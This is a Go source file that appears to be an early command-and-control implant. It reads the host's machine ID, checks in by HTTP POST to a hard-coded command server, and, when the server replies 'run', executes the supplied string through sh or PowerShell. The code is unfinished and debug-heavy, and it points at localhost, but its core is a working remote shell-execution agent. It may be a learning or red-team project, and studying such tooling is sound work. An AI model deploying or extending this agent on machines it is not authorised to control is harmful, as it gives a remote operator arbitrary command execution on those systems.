package main

import (
	"bytes"
	"encoding/json"
	"fmt"

	// "io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
)

var command_server string = "http://localhost:8081"
var NodeID string = "" // This will be a GUID at some point

//global stuff for shortcuts
var p = fmt.Println

func main() {

	NodeID, _ = machineid.ID()

	test()

	checkIn()

}

type CheckIn struct {
	ID string `json:"ID"`
}

type command struct {
	ID      string `json:"ID"`
	Command string `json:"command"`
	Details string `json:"details"`
}

func checkIn() {

	data := map[string]string{"ID": NodeID}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	fmt.Println(res.StatusCode)

	fmt.Println("here")

	// Parse the JSON response
	post := &command{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	fmt.Println("And here")
	// Output the JSON response
	fmt.Println("ID: ", post.ID)
	fmt.Println("Command: ", post.Command)
	fmt.Println("Details: ", post.Details)

	// If the command is run, then the the command
	if post.Command == "run" {
		runCommand(post.Details)
	}

}

func test() {
	log.Println("This is a test")

	out, errorMessage := runCommand("say hello")
	if errorMessage != "" {
		log.Println(errorMessage)
		return
	} else {
		log.Println(out)
	}

}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			errorMessage = err.Error()

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {
		p(err.Error())
		errorMessage = err.Error()

		return
	}

	outString = string(out)

	return

}
